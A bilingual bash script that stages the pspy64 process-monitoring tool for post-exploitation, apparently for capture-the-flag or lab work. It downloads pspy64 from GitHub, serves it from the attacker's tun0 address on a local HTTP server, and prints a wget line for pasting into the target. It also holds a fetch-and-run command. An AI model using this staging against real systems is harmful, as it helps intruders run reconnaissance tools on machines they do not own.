#!/bin/bash

# ASCII Art and welcome message / ASCII Art et message d'accueil
echo " ____________________________________"
echo "          /PsPy. \\"
echo "|                                    |"
echo "        \\  By HyDroZz    /"
echo " ------------------------------------"
echo -e "    ^__^"
echo -e "    (oo)\\_______"
echo -e "    (__)\\       )\\/\\"
echo -e "        ||----w |"
echo -e "        ||     ||"


# By default, use the tun0 interface / Par défaut, utilise l'interface tun0
interface="tun0"

# Analyze command line arguments / Analyse les arguments de ligne de commande
while getopts "i:" opt; do
  case ${opt} in
    i )
      interface=$OPTARG
      ;;
    \? )
      echo "Invalid option / Option invalide: -$OPTARG" 1>&2
      exit 1
      ;;
    : )
      echo "Option -$OPTARG requires an argument / L'option -$OPTARG nécessite un argument." 1>&2
      exit 1
      ;;
  esac
done
shift $((OPTIND -1))

# Get the IP address of the specified interface / Obtenir l'adresse IP de l'interface spécifiée
echo -e "\e[34mGetting the IP address of interface $interface\e[0m"
echo -e "\e[34mObtention de l'adresse IP de l'interface $interface...\n\e[0m"
ip_address=$(ip -o -4 addr show dev $interface | awk '{split($4,a,"/");print a[1]}')

# Store the wget command in a variable / Stocker la commande wget dans une variable
wget_command="wget http://$ip_address/pspy64 | bash pspy64"

# Download the latest version of linpeas.sh, replacing the existing file / Télécharger la dernière version de linpeas.sh en remplaçant le fichier existant
echo -e "\e[34mTéléchargement de la dernière version de pspy en remplaçant le fichier existant...\e[0m"
curl -Lf https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -o pspy64

# Display the wget command with the IP address of the specified interface in red / Afficher la commande wget avec l'adresse IP de l'interface spécifiée en rouge
printf "\nCopier cette ligne : \e[31m\e[7m\e[5m\e[1m%*swget http://%s:80/pspy64\e[0m\n" $(((${#ip_address} + 12) / 2)) "" "$ip_address"
echo -e "\n"
# Launch a local HTTP server to serve linpeas.sh / Lancer un serveur HTTP local pour servir linpeas.sh
printf "\e[32m\e[1mHTTP server launched on http://%s:80\n ( CTRL+C for STOP )" "$ip_address"
python3 -m http.server 80

# Remove linpeas.sh file when the user stops the web server / Supprimer le fichier linpeas.sh lorsque l'utilisateur arrête le serveur web
echo -e "\e[34mArrêt du serveur web. Suppression du fichier pspy64...\e[0m"
rm pspy64

